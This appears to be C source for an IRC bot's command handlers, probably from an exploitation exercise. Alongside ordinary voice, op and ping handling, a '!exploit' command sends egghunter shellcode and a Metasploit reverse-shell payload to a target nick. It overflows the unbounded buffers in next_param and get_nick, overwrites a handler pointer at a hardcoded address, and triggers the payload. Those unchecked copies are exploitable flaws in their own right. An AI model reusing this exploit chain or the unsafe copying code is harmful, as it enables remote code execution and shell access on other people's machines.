#include "global.h"

static void privmsg_handle(int fd, struct Msg *msg);
static void end_list_handle(int fd, struct Msg *msg);
static void ping_handle(int fd, struct Msg *msg);
static void join_handle(int fd, struct Msg *msg);

static char *next_param(char *cmd, char **ptr)
{
	static char buff[MAX_CMD_LEN + 1] = {0};
	int i;
	
	for(i = 0; cmd[i] && cmd[i] != ' '; i++)
	{
		buff[i] = cmd[i];
	}
	buff[i++] = 0;
	*ptr = cmd + i;
	
	return buff;
}
static char *get_nick(const char *from)
{
	static char nick[MAX_NICK_LEN + 1];
	int i;
	for(i = 0; from[i] && from[i] != '!'; i++)
	{
		nick[i] = from[i];
	}
	nick[i] = '\0';
	return nick;
}

static char *get_host(const char *from)
{
	static char host[MAX_FROM_LEN + 1];
	for(; *from && *from != '@'; from++);
	if(*from == '\0')
	{
		return NULL;
	}
	strncpy(host, from + 1, MAX_FROM_LEN);
	return host;
}

void init_handlers(void)
{
	add_handler("376", end_list_handle);
	add_handler("JOIN", join_handle);
	add_handler("PRIVMSG", privmsg_handle);
	add_handler("PING", ping_handle);
}

static void join_handle(int fd, struct Msg *msg)
{
	write_msg(fd, "MODE %s +v %s\r\n", CHANNEL, get_nick(msg->from));
}
static void ping_handle(int fd, struct Msg *msg)
{
	write_msg(fd, "PONG :%s\r\n", msg->data);
}

static void end_list_handle(int fd, struct Msg *msg)
{
	write_msg(fd, "JOIN %s\r\n", CHANNEL);
}

static void privmsg_handle(int fd, struct Msg *msg)
{
	char *ptr, *cmd;
	if(!strcmp(msg->to, NICK) && msg->data[0] == '!')
	{
		cmd = next_param(msg->data, &ptr);
		if(!strcmp(cmd, "!voice"))
		{
			cmd = next_param(ptr, &ptr);
			write_msg(fd, "MODE %s +v %s\r\n", CHANNEL, cmd);
		}
		else if(!strcmp(cmd, "!devoice"))
		{
			cmd = next_param(ptr, &ptr);
			write_msg(fd, "MODE %s -v %s\r\n", CHANNEL, cmd);
		}
		else if(!strcmp(cmd, "!op"))
		{
			cmd = next_param(ptr, &ptr);
			write_msg(fd, "MODE %s +o %s\r\n", CHANNEL, cmd);
		}
		else if(!strcmp(cmd, "!deop"))
		{
			cmd = next_param(ptr, &ptr);
			write_msg(fd, "MODE %s -o %s\r\n", CHANNEL, cmd);
		}
		else if(!strcmp(cmd, "!exploit"))
        {
            /* offsets
            0x24 : 36  = n_handlers
            0x40 : 64  = Handler.cmd
            0x64 : 100 = Handler.handler
             */
            // get nick
			cmd = next_param(ptr, &ptr);
            // egghunter
            char egghunter[] = "\xfc\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f"
                "\x42\x6a\x21\x58\x8d\x5a\x04\xcd\x80\x3c"
                "\xf2\x74\xee\xb8"
                "\x90\x50\x90\x50"   // <- Signature
                "\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";
            char payload[] = "\x90\x50\x90\x50" // <- Signature
                "\x90\x50\x90\x50" // <- Signature
                // metasploit linux reverse shell
                // LHOST=127.0.0.1 LPORT=3333
                // ./msfvenom -b '\x00\x20:;!' -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=3333 -f c
                "\xb8\x06\x8c\xfd\x88\xdb\xdb\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
                "\x12\x31\x47\x12\x03\x47\x12\x83\xc1\x88\x1f\x7d\xfc\x4b\x28"
                "\x9d\xad\x28\x84\x08\x53\x26\xcb\x7d\x35\xf5\x8c\xed\xe0\xb5"
                "\xb2\xdc\x92\xff\xb5\x27\xfa\x80\x45\xd8\xfb\x16\x44\xd8\xf6"
                "\xe3\xc1\x39\xb8\x8a\x81\xe8\xeb\xe1\x21\x82\xea\xcb\xa6\xc6"
                "\x84\xfc\x89\x95\x3c\x6b\xf9\x3b\xd5\x05\x8c\x5f\x77\x89\x07"
                "\x7e\xc7\x26\xd5\x01"
                ;
            // prepare attack payload
            char *attack;
            attack = calloc (1024, sizeof (*attack));
            // inject our payload
            memset (attack, 0x90, MAX_DATA_LEN);
            memcpy (attack + 128, payload, sizeof (payload));
            write_msg (fd, "PRIVMSG %s :%s\r\n", cmd, attack);
            printf ("Shellcode injected\n");

            // overwrite handler
            memset (attack, 0, 1024);
            memset (attack, 'A', 100);
            // overwrite handler address with buff global address where there is our egghunter
            memcpy (attack + 100, "\x21\xb1\x04\x08", 5);
            write_msg (fd, "PRIVMSG %s :!voice %s\r\n", cmd, attack);
            printf ("Handler overwritten\n");

            // overwrite command
            memset (attack, 0, 1024);
            // inject our egghunter
            memset (attack, 0x90, 64);
            memcpy (attack + (64 - strlen (egghunter)), egghunter, strlen (egghunter));
            // command
            memcpy (attack + 64, "PRIVMSG", 8);
            write_msg (fd, "PRIVMSG %s :!voice %s\r\n", cmd, attack);
            printf ("Command overwritten\n");

            // trigger payload
            write_msg (fd, "PRIVMSG %s :Sending exploit\r\n", cmd);
            printf ("Payload triggered\n");
        }
        else
        {
            write_msg(fd, "PRIVMSG %s :Commands : !voice, !devoice\r\n", get_nick(msg->from));
        }
    }
}
